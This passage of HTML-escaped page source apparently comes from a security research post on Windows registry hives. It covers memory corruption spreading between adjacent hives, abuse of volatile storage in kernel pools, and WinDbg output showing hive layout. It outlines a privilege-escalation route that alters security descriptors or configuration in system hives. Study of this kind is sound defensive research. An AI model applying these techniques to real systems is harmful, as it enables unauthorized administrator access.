class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;...BBBBBBBBBBBB&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00000152`80400030&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42-42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BBBBBBBBBBBBBBBB&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00000152`80400040&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42-42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BBBBBBBBBBBBBBBB&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;We can clearly see that the bytes belonging to both hives in question exist within a single, continuous memory area.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This, in turn, means that memory corruption could indeed spread from one hive into the other.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, to successfully achieve this result, one would also need to ensure that the specific fragment of the target hive is marked as &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c21&quot;&gt;dirty&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Otherwise, this memory page would be marked as PAGE_READONLY, which would lead to a system crash when attempting to write data, despite both regions being directly adjacent to each other.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c6 ormwWEjHLs-c36&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;After successfully corrupting data in a global, system hive, the remainder of the attack would likely involve either modifying a security descriptor to grant oneself write permissions to specific keys, or directly changing configuration data to enable the execution of one&amp;#39;s own code with administrator privileges.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ormwWEjHLs-c18&quot; id=&quot;h.st4lfvr8nazp&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c27 ormwWEjHLs-c14&quot;&gt;Attacking adjacent memory in pool-based hive mappings&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Although hive file views are typically mapped in the user-mode space of the Registry process (which contains nothing else but these mappings), there are a few circumstances where this data is stored directly in kernel-mode pools.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These cases are as follows:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_qux0xwfdwk15-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;All volatile hives, which have no persistent representation as regf files on disk.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Examples include the virtual hive rooted at \Registry, as well as the HKLM\HARDWARE hive.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;The entire HKLM\SYSTEM hive, including both its stable and volatile parts.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span&gt;All hives that have been recently created by calling one of the NtLoadKey* syscalls on a previously non-existent file, including newly created app hives.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c16 c26 li-bullet-0&quot;&gt;&lt;span&gt;Volatile storage space of every active hive in the system.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;ormwWEjHLs-c6 ormwWEjHLs-c34&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c34&quot;&gt;&lt;span&gt;The first point is not useful to a potential attacker because these types of hives do not grant unprivileged users write permissions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The second and third points are also quite limited, as they could only be exploited through memory corruption that doesn&amp;#39;t require binary control over the input hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, the fourth point makes it possible to exploit vulnerabilities in any hive in the system, including app hives.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is because creating volatile keys does not require any special permissions compared to regular keys.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Additionally, if we have a memory corruption primitive within one storage type, we can easily influence data within the other.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For example, in the case of stable storage memory corruption, it is enough to craft a value for which the cell index _CM_KEY_VALUE.Data has the highest bit set, and thus points to the volatile space.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;From this point, we can arbitrarily modify regf structures located in that space, and directly read/write out-of-bounds pool memory by setting a sufficiently long value size (exceeding the bounds of the given bin). Such a situation is shown in the diagram below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c8&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiwdjl_tY5_eFExX7fyulnd_12nKwtRyU0A0PuyfvRVRSAxDM87wwKHt6J0ZvGlBSlcI4djUqRvBf2gIHrtFjSsuWHvqnjLW_uYS7Rg52hN0xXksfff_cLkkLCM6K70XTTufbvxnGB3eVjgogqH8TxROECqag4eHT0Dp7riNOjZhBsQjtp7Aasxzfg5-2s/s768/image2.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiwdjl_tY5_eFExX7fyulnd_12nKwtRyU0A0PuyfvRVRSAxDM87wwKHt6J0ZvGlBSlcI4djUqRvBf2gIHrtFjSsuWHvqnjLW_uYS7Rg52hN0xXksfff_cLkkLCM6K70XTTufbvxnGB3eVjgogqH8TxROECqag4eHT0Dp7riNOjZhBsQjtp7Aasxzfg5-2s/s768/image2.png&quot; border=&quot;0&quot; alt=&quot;A diagram illustrating memory corruption, divided into two sections. The top section, labeled &amp;quot;Kernel-mode paged pool,&amp;quot; shows a memory bar containing &amp;quot;test.dat (volatile)&amp;quot; followed by several &amp;quot;Pool chunk&amp;quot; blocks and a dotted &amp;quot;Pool chunks...&amp;quot; block. The pool chunks are showed being overflowed. The bottom section, labeled &amp;quot;Registry process address space,&amp;quot; shows a memory bar with a small corrupted area at the beginning, followed by &amp;quot;test.dat (stable)&amp;quot; and a dotted &amp;quot;... Other hives ...&amp;quot; block. An arrow from a &amp;quot;Corrupted value node&amp;quot; label points to this red area. A red arrow labeled &amp;quot;Volatile cell index&amp;quot; connects the &amp;quot;Pool corruption&amp;quot; in the kernel-mode paged pool to the &amp;quot;Corrupted value node&amp;quot; in the registry process address space, indicating a relationship between the two corrupted areas.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A diagram illustrating memory corruption, divided into two sections. The top section, labeled &amp;quot;Kernel-mode paged pool,&amp;quot; shows a memory bar containing &amp;quot;test.dat (volatile)&amp;quot; followed by several &amp;quot;Pool chunk&amp;quot; blocks and a dotted &amp;quot;Pool chunks...&amp;quot; block. The pool chunks are showed being overflowed. The bottom section, labeled &amp;quot;Registry process address space,&amp;quot; shows a memory bar with a small corrupted area at the beginning, followed by &amp;quot;test.dat (stable)&amp;quot; and a dotted &amp;quot;... Other hives ...&amp;quot; block. An arrow from a &amp;quot;Corrupted value node&amp;quot; label points to this red area. A red arrow labeled &amp;quot;Volatile cell index&amp;quot; connects the &amp;quot;Pool corruption&amp;quot; in the kernel-mode paged pool to the &amp;quot;Corrupted value node&amp;quot; in the registry process address space, indicating a relationship between the two corrupted areas.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;This&lt;/span&gt;&lt;span&gt;&amp;nbsp;behavior can be further verified on a specific example.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Let&amp;#39;s consider the HKCU hive for a user logged into a Windows 11 system &amp;ndash; it will typically have some data stored in the volatile storage due to the existence of the &amp;quot;HKCU\Volatile Environment&amp;quot; key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Let&amp;#39;s first find the hive &lt;/span&gt;&lt;span&gt;in WinDbg using the !reg hivelist command&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;!reg&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;hivelist&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;HiveAddr&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;|Stable&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Length|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Stable&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;|Volatile&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Length|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Volatile&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;BaseBlock&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;FileName&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;[...]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffff82828fc1a000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ee000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffff82828fc1a128&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;5000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffff82828fc1a3a0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffff82828f8cf000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\??\C:\Users\user\ntuser.dat&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;[...]&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;As can be seen, the hive has a volatile space of 0x5000 bytes (5 &lt;/span&gt;&lt;span&gt;memory &lt;/span&gt;&lt;span&gt;pages).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Let&amp;#39;s try to find the second page of this hive region in memory by translating its corresponding cell index:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;!reg&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;cellindex&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828fc1a000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;80001000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828fc1a3a0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 